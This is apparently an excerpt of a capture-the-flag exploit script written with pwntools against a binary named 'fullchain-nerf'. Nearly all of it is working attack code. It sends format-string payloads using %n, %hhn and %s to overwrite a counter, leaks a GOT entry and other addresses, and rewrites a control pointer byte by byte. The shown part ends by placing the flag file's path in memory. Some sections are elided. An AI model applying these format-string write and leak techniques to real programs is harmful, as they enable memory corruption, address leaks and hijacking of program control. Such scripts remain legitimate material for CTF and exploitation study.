...
r.sendline(b'AAAAAAAAAAAAAAAA'+p64(cnt_addr)+b'\x00')

response_prompt(r, b"local", b"write%12$n")

# set cnt to 1000
response_prompt(r, b"global", b"read")
r.sendline(b'%10000c%12$n\x00')
...
response_prompt(r, b"local", b"read")
r.sendline(b'A'*16+p64(got_printf_addr)+b'\x00')

response_prompt(r, b"global", b"read")
r.sendline(b'%12$s\x00')
...
# leak "global" address
global_addr = text_addr + 0x40a0
print("global_addr: ", hex(global_addr))

def change_control_ptr(r, addr, update_bits=None):
    def send_byte(addr, byte):
        response_prompt(r, b"local", b"read")
        r.sendline(b'A'*16+p64(addr)+b'\x00')

        response_prompt(r, b"global", b"read")
        fmt = f'%12$hhn\x00' if int(byte) == 0 else f'%{int(byte)}c%12$hhn\x00'
        print("modify", hex(addr), hex(byte), fmt)
    ...
    for i, byte in enumerate(reversed(p64(addr))):
        if update_bits and i < 8 - update_bits:
            continue
        send_byte(local_addr+31-i, byte)


def modify_byte(r, addr, byte):
    response_prompt(r, b"global", b"read")
    fmt = f'%13$hhn\x00' if int(byte) == 0 else f'%{int(byte)}c%13$hhn\x00'
    r.sendline(fmt.encode())
...
print("fn_addr", hex(fn_addr))

modify(r, fn_addr, b"/home/fullchain-nerf/flag\x00")
